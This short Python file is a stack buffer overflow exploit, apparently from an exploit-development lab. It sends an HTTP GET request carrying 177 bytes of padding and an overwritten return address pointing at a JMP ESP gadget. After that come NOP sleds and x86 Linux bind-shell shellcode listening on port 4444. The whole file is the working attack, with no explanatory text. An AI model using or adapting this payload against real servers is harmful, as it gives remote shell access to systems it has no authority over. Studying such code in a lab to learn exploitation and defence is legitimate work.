# JMP ESP variation

import struct

from exploitdev.util import nops
from exploitdev.shellcode import generate

jmp_esp = 0xb7ec7a51

eip_offset = 177
eip = struct.pack("I", jmp_esp)

shellcode = generate("bind", "x86_linux", 4444)

def execute():
    prefix = "GET /"
    suffix = " HTTP/1.1\n\n"

    padding = eip_offset * "A"
    
    payload = padding
    payload += eip
    payload += nops(32)
    payload += shellcode.opcodes
    payload += nops(16)
    
    return prefix + payload + suffix
